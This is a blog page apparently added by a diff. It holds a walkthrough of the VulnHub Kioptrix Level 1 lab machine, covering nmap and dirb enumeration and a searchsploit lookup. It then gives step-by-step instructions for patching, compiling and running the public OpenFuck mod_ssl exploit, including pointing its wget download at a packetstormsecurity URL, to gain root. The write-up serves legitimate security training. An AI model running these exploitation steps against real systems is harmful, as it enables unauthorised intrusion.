@@ -1,0 +1,468 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+  <meta http-equiv="content-type" content="text/html;charset=utf-8">
+  <meta http-equiv="X-UA-Compatible" content="chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="robots" content="noodp"/>
+  
+  
+  
+  
+  
+  <link rel="prev" href="https://hussein-elsayed.github.io/2020/duckuino/" />
+  <link rel="next" href="https://hussein-elsayed.github.io/2021/hello/" />
+  <link rel="canonical" href="https://hussein-elsayed.github.io/2020/kioptrix1/" />
+  <link rel='shortcut icon' type='image/x-icon' href='/favicon.ico' />
+  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+  <link rel="manifest" href="/site.webmanifest">
+  <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+  <meta name="msapplication-TileColor" content="#da532c">
+  <meta name="theme-color" content="#ffffff">
+  <title>
+       
+       
+           Kioptrix Level 1 Writeup | Wh1rlw1nd
+       
+  </title>
+  <meta name="title" content="Kioptrix Level 1 Writeup | Wh1rlw1nd">
+    
+  
+  <link rel="stylesheet" href="/font/iconfont.css">
+  <link rel="stylesheet" href="/css/main.min.css">
+
+
+  <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Kioptrix Level 1 Writeup"/>
+<meta name="twitter:description" content="This machine is from vulnhub you can download it here.   After downloading the machine you will open the .vmx file in VMware or .vmdk with VirtualBox.
+  It&rsquo;s a preconfigured machine it must work directly, but you may need to change the network adapter to NAT and the version to linux and kernal version you work on, then power it on &hellip;
+  have fun&hellip; 0. Getting VM&rsquo;s IP:  using Netdiscover or Nmap  $ nmap -sn 192."/>
+
+  <script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Kioptrix Level 1 Writeup",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https:\/\/hussein-elsayed.github.io\/2020\/kioptrix1\/"
+  },
+  "image": {
+    "@type": "ImageObject",
+    "url": "https:\/\/hussein-elsayed.github.io\/cover.png",
+    "width":  800 ,
+    "height":  600 
+  },
+  "genre": "posts",
+  "keywords": "Writeups, Vulnhub",
+  "wordcount":  503 ,
+  "url": "https:\/\/hussein-elsayed.github.io\/2020\/kioptrix1\/",
+  "datePublished": "2020-03-03T15:47:35\u002b02:00",
+  "dateModified": "2020-03-03T15:47:35\u002b02:00",
+  
+  "publisher": {
+    "@type": "Organization",
+    "name": "Wh1rlw1nd",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https:\/\/hussein-elsayed.github.io\/logo.png",
+      "width":  127 ,
+      "height":  40 
+    }
+  },
+  "author": {
+    "@type": "Person",
+    "name": "Wh1rlw1nd"
+  },
+  "description": ""
+}
+</script>
+</head>
+
+  
+
+
+
+  <body class="">
+    <div class="wrapper">
+        <nav class="navbar">
+    <div class="container">
+        <div class="navbar-header header-logo">
+        	<a href="https://hussein-elsayed.github.io/">Wh1rlw1nd</a>
+        </div>
+        <div class="menu navbar-right">
+                
+                
+                <a class="menu-item" href="/posts/" title="">Blog</a>
+                
+                <a class="menu-item" href="/tags/" title="">Tags</a>
+                
+                <a class="menu-item" href="/about" title="">About</a>
+                
+                <a href="javascript:void(0);" class="theme-switch"><i class="iconfont icon-sun"></i></a>&nbsp;
+        </div>
+    </div>
+</nav>
+<nav class="navbar-mobile" id="nav-mobile" style="display: none">
+     <div class="container">
+        <div class="navbar-header">
+            <div>  <a href="javascript:void(0);" class="theme-switch"><i class="iconfont icon-sun"></i></a>&nbsp;<a href="https://hussein-elsayed.github.io/">Wh1rlw1nd</a></div>
+            <div class="menu-toggle">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+     
+          <div class="menu" id="mobile-menu">
+                
+                
+                <a class="menu-item" href="/posts/" title="">Blog</a>
+                
+                <a class="menu-item" href="/tags/" title="">Tags</a>
+                
+                <a class="menu-item" href="/about" title="">About</a>
+                
+        </div>
+    </div>
+</nav>
+
+    	 <main class="main">
+          <div class="container">
+      		
+<article class="post-warp">
+    <header class="post-header">
+        <h1 class="post-title">Kioptrix Level 1 Writeup</h1>
+        <div class="post-meta">
+            Written by <a href="https://hussein-elsayed.github.io/" rel="author">Wh1rlw1nd</a> with ♥ 
+                <span class="post-time">
+                    on <time datetime=2020-03-03 >3 March 2020</time>
+                </span>
+                in
+                
+                <i class="iconfont icon-timer"></i>
+                3 min
+        </div>
+    </header>
+    <div class="post-content">
+        
+
+        
+            
+        
+
+        
+        
+     
+          
+          
+          
+
+          
+          
+          
+
+          <h3 id="this-machine-is-from-vulnhub-you-can-download-it-herehttpswwwvulnhubcomentrykioptrix-level-1-122">This machine is from vulnhub you can download it <a href="https://www.vulnhub.com/entry/kioptrix-level-1-1,22/">here</a>.</h3>
+<ul>
+<li>
+<p>After downloading the machine you will open the .vmx file in VMware or .vmdk with VirtualBox.</p>
+</li>
+<li>
+<p>It&rsquo;s a preconfigured machine it must work directly, but you may need to change the network adapter to NAT and the version to linux and kernal version you work on, then power it on &hellip;</p>
+</li>
+</ul>
+<p><strong>have fun</strong>&hellip; <figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/kioptrix1/1.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure></p>
+<h3 id="0-getting-vms-ip">0. Getting VM&rsquo;s IP:</h3>
+<ul>
+<li>using <strong>Netdiscover</strong> or <strong>Nmap</strong></li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">$ nmap <span style="color:#f92672">-</span>sn 192<span style="color:#f92672">.</span><span style="color:#a6e22e">168</span><span style="color:#f92672">.</span><span style="color:#a6e22e">1</span><span style="color:#f92672">.</span><span style="color:#a6e22e">0</span><span style="color:#f92672">/</span>24
+Starting Nmap 7<span style="color:#f92672">.</span><span style="color:#a6e22e">80</span> <span style="color:#f92672">(</span> https<span style="color:#f92672">:</span><span style="color:#75715e">//nmap.org ) at 2020-03-01 17:18 EET
+</span><span style="color:#75715e"></span>Nmap scan report <span style="color:#66d9ef">for</span> 192<span style="color:#f92672">.</span><span style="color:#a6e22e">168</span><span style="color:#f92672">.</span><span style="color:#a6e22e">1</span><span style="color:#f92672">.</span><span style="color:#a6e22e">1</span>
+Host is <span style="color:#a6e22e">up</span> <span style="color:#f92672">(</span>0<span style="color:#f92672">.</span><span style="color:#a6e22e">0045s</span> latency<span style="color:#f92672">).</span>
+Nmap scan report <span style="color:#66d9ef">for</span> 192<span style="color:#f92672">.</span><span style="color:#a6e22e">168</span><span style="color:#f92672">.</span><span style="color:#a6e22e">1</span><span style="color:#f92672">.</span><span style="color:#a6e22e">7</span>
+Host is <span style="color:#a6e22e">up</span> <span style="color:#f92672">(</span>0<span style="color:#f92672">.</span><span style="color:#a6e22e">00016s</span> latency<span style="color:#f92672">).</span>
+Nmap scan report <span style="color:#66d9ef">for</span> 192<span style="color:#f92672">.</span><span style="color:#a6e22e">168</span><span style="color:#f92672">.</span><span style="color:#a6e22e">1</span><span style="color:#f92672">.</span><span style="color:#a6e22e">104</span> <span style="color:#f92672">&lt;&lt;</span> kioptrix ip
+Host is <span style="color:#a6e22e">up</span> <span style="color:#f92672">(</span>0<span style="color:#f92672">.</span><span style="color:#a6e22e">0033s</span> latency<span style="color:#f92672">).</span>
+</code></pre></div><h3 id="1-enumeration">1. Enumeration:</h3>
+<ul>
+<li>
+<h4 id="nmap">Nmap:</h4>
+<ul>
+<li>To discover open ports and services running on our machine</li>
+</ul>
+</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-yml" data-lang="yml"><span style="color:#ae81ff">$ nmap -T4 -A -v 192.168.1.104</span>
+<span style="color:#ae81ff">PORT STATE SERVICE VERSION</span>
+<span style="color:#ae81ff">22</span><span style="color:#ae81ff">/tcp open ssh OpenSSH 2.9p2 (protocol 1.99)</span>
+<span style="color:#ae81ff">80</span><span style="color:#ae81ff">/tcp open http Apache httpd 1.3.20 ((Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)</span>
+<span style="color:#ae81ff">111</span><span style="color:#ae81ff">/tcp open rpcbind 2 (RPC</span> <span style="color:#75715e">#100000)</span>
+<span style="color:#f92672">139/tcp open netbios-ssn Samba smbd (workgroup</span>: <span style="color:#ae81ff">MYGROUP)</span>
+<span style="color:#ae81ff">443</span><span style="color:#ae81ff">/tcp open ssl/https Apache/1.3.20 (Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b</span>
+<span style="color:#ae81ff">1024</span><span style="color:#ae81ff">/tcp open status 1 (RPC</span> <span style="color:#75715e">#100024)</span>
+<span style="color:#f92672">MAC Address</span>: <span style="color:#ae81ff">50</span>:<span style="color:#ae81ff">3E:AA:BE:1F:AB (Tp-link Technologies)</span>
+<span style="color:#f92672">Device type</span>: <span style="color:#ae81ff">general purpose</span>
+<span style="color:#f92672">Running</span>: <span style="color:#ae81ff">Linux 2.4.X</span>
+<span style="color:#f92672">OS CPE</span>: <span style="color:#ae81ff">cpe:/o:linux:linux_kernel:2.4</span>
+<span style="color:#f92672">OS details</span>: <span style="color:#ae81ff">Linux 2.4.9 - 2.4.18 (likely embedded)</span>
+</code></pre></div><p>After scanning there are lots of running services:</p>
+<ul>
+<li>Apache</li>
+<li>Openssh</li>
+<li>RPC</li>
+<li>Samba</li>
+</ul>
+<h3 id="2-web-enumeration">2. Web Enumeration:</h3>
+<ul>
+<li>Just apache default page.
+<figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/kioptrix1/2.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure></li>
+<li>tried to enumerate, if there any hidden directories:</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">$ dirb http://192.168.1.104/ /usr/share/wordlists/dirb/common.txt
+
+GENERATED WORDS: 4612
+
+---- Scanning URL: http://192.168.1.104/ ----
++ http://192.168.1.104/~operator (CODE:403|SIZE:273)
++ http://192.168.1.104/~root (CODE:403|SIZE:269)
++ http://192.168.1.104/cgi-bin/ (CODE:403|SIZE:272)
++ http://192.168.1.104/index.html (CODE:200|SIZE:2890)
+==&gt; DIRECTORY: http://192.168.1.104/manual/
+==&gt; DIRECTORY: http://192.168.1.104/mrtg/
+==&gt; DIRECTORY: http://192.168.1.104/usage/
+
+---- Entering directory: http://192.168.1.104/manual/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.
+(Use mode &#39;-w&#39; if you want to scan it anyway)
+
+---- Entering directory: http://192.168.1.104/mrtg/ ----
++ http://192.168.1.104/mrtg/index.html (CODE:200|SIZE:17318)
+
+---- Entering directory: http://192.168.1.104/usage/ ----
++ http://192.168.1.104/usage/index.html (CODE:200|SIZE:3704)
+</code></pre></div><ul>
+<li>nothing useful.</li>
+</ul>
+<h3 id="searching-for-exploits">Searching for exploits:</h3>
+<ul>
+<li>To do so there are many ways;
+<ul>
+<li><a href="https://www.exploit-db.com/searchsploit">Searchsploit</a> (local exploit db)</li>
+<li><a href="https://exploit-db.com/">Exploit DB</a></li>
+<li><a href="www.securityfocus.com">Security Focus</a></li>
+</ul>
+</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text"># searchsploit apache mod_ssl
+</code></pre></div><p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/kioptrix1/3.png" alt="Apache mod_ssl < 2.8.7 OpenSSL - &lsquo;OpenFuckV2.c&rsquo; Remote Bof | exploits/unix/remote/764.c" class="lazyload"><figcaption class="image-caption">Apache mod_ssl < 2.8.7 OpenSSL - &lsquo;OpenFuckV2.c&rsquo; Remote Bof | exploits/unix/remote/764.c</figcaption></figure></p>
+<ul>
+<li>now we got an exploit matches our version lets try it out (the 2nd one 764.c) ..</li>
+</ul>
+<p>Opening the link for this exploit&rsquo;s author, it needs to be updated before using it:</p>
+<ul>
+<li>
+<p>To deal with it open the script: <code>nano /usr/share/exploitdb/exploits/unix/remote/764.c</code></p>
+</li>
+<li>
+<p>First install <code>libssl-dev</code> &raquo; <code>$ sudo apt-get install libssl-dev</code></p>
+</li>
+<li>
+<p>Add:</p>
+<ul>
+<li>#include &lt;openssl/rc4.h&gt;</li>
+<li>#include &lt;openssl/md5.h&gt;</li>
+</ul>
+</li>
+<li>
+<p>search for <code>wget</code> and replace the link with this one : <code>https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c</code></p>
+</li>
+<li>
+<p>search for <code>get_server_hello</code> then replace it with <code>const unsigned char *p, *end;</code></p>
+</li>
+<li>
+<p>copy the script to desktop to run it: <code>$ cp /usr/share/exploitdb/exploits/unix/remote/764.c</code></p>
+</li>
+<li>
+<p>compile it: <code>$ gcc -o openfuck 764.c -lcrypto</code></p>
+</li>
+<li>
+<p>run it with no parameters at first: <code>$ ./openfuck</code>
+<figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/kioptrix1/4.png" alt="As you can see the version of our running apache and the parameter we shall use &hellip;" class="lazyload"><figcaption class="image-caption">As you can see the version of our running apache and the parameter we shall use &hellip;</figcaption></figure></p>
+</li>
+<li>
+<p>we will use the second one &raquo; <code>$ ./openfuck 0x6b 192.168.1.104  -c  42</code>
+<figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/kioptrix1/5.png" alt="As you can see the script worked and we got root access &hellip;" class="lazyload"><figcaption class="image-caption">As you can see the script worked and we got root access &hellip;</figcaption></figure></p>
+</li>
+<li>
+<p><code>$ cat  /var/mail/root</code>
+<figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/kioptrix1/6.png" alt="Got our flag#" class="lazyload"><figcaption class="image-caption">Got our flag#</figcaption></figure></p>
+</li>
+<li>
+<p>note: we could do the same searchsploit search on Openssh and Samba..Both of them are outdated and maybe they have exploits.. but starting with apache just worked fine with me.</p>
+<ul>
+<li>i think we could get root with samba, yeah.. try it yourself.</li>
+</ul>
+</li>
+</ul>
+<p>I hope you enjoyed &hellip;</p>
+
+    </div>
+
+    <div class="post-copyright">
+             
+            <p class="copyright-item">
+                <span>Author:</span>
+                <span>Wh1rlw1nd </span>
+                </p>
+            
+           
+            <p class="copyright-item">
+                    <span>Words:</span>
+                   <span>503</span>
+            </p>
+            
+            <p class="copyright-item">
+                
+                <span>Share:</span>
+                <span>
+
+      
+        <a href="//twitter.com/share?url=https%3a%2f%2fhussein-elsayed.github.io%2f2020%2fkioptrix1%2f&amp;text=Kioptrix%20Level%201%20Writeup&amp;via=Wh1r1w1nd" target="_blank" title="Share on Twitter">
+          <i class="iconfont icon-twitter"></i>
+        </a>
+        
+      
+      
+        <a href="//www.facebook.com/sharer/sharer.php?u=https%3a%2f%2fhussein-elsayed.github.io%2f2020%2fkioptrix1%2f" target="_blank" title="Share on Facebook">
+          <i class="iconfont icon-facebook"></i>
+        </a>
+        
+      
+      
+      
+      
+        <a href="//www.linkedin.com/shareArticle?url=https%3a%2f%2fhussein-elsayed.github.io%2f2020%2fkioptrix1%2f&amp;title=Kioptrix%20Level%201%20Writeup" target="_blank" title="Share on LinkedIn">
+          <i class="iconfont icon-linkedin"></i>
+        </a>
+        
+      
+      
+        
+      
+        
+      
+
+          
+
+          
+
+          
+
+          
+</span>
+                
+            </p>
+
+             
+            <p class="copyright-item">
+                Released under <a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a>
+            </p>
+            
+    </div>
+
+  
+    <div class="post-tags">
+        
+            <section>
+            <i class="iconfont icon-icon-tag"></i>Tag: 
+            
+            <span class="tag"><a href="https://hussein-elsayed.github.io/tags/writeups/">
+                    #Writeups</a></span>
+            
+            <span class="tag"><a href="https://hussein-elsayed.github.io/tags/vulnhub/">
+                    #Vulnhub</a></span>
+            
+            </section>
+        
+        <section>
+                <a href="javascript:window.history.back();">Back</a></span> · 
+                <span><a href="https://hussein-elsayed.github.io/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav">
+        
+        <a href="https://hussein-elsayed.github.io/2020/duckuino/" class="prev" rel="prev" title="Duckuino"><i class="iconfont icon-dajiantou"></i>&nbsp;Duckuino</a>
+         
+        
+        <a href="https://hussein-elsayed.github.io/2021/hello/" class="next" rel="next" title="Hello world!">Hello world!&nbsp;<i class="iconfont icon-xiaojiantou"></i></a>
+        
+    </div>
+
+    <div class="post-comment">
+          
+          <div id="disqus_thread"></div>
+  <script type="text/javascript">
+      (function() {
+          
+          
+          if (window.location.hostname == "localhost")
+              return;
+          var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+          var disqus_shortname = 'disqus_NIRv8ve7PS';
+          dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+          (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+      })();
+  </script>
+  <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+  <a href="https://disqus.com/" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+
+ 
+
+          
+    </div>
+</article>
+          </div>
+		   </main>
+      <footer class="footer">
+    <div class="copyright">
+        &copy;
+        
+        <span itemprop="copyrightYear">2020 - 2021</span>
+        
+         
+            <span class="author" itemprop="copyrightHolder"><a href="https://hussein-elsayed.github.io/">Wh1rlw1nd</a> | </span>
+         
+
+		  <span>Crafted with ❤️ by <a href="https://github.com/Fastbyte01/KeepIt" target="_blank" rel="external nofollow noopener noreffer">KeepIt</a> & <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreffer">Hugo</a></span>
+    </div>
+</footer>
+
+
+
+
+
+
+
+
+
+
+
+
+    
+    <link crossorigin="anonymous" integrity="sha384-yziQACfvCVwLqVFLqkWBYRO3XeA4EqzfXKGwaWnenYn5XzqfJFlFdKEmvutIQdKb" href="https://lib.baomitu.com/lightgallery/1.6.12/css/lightgallery.min.css" rel="stylesheet">
+      
+     <script src="/js/vendor_gallery.min.js" async="" ></script>
+    
+  
+
+
+
+
+
+
+
+     </div>
+  </body>
+</html>
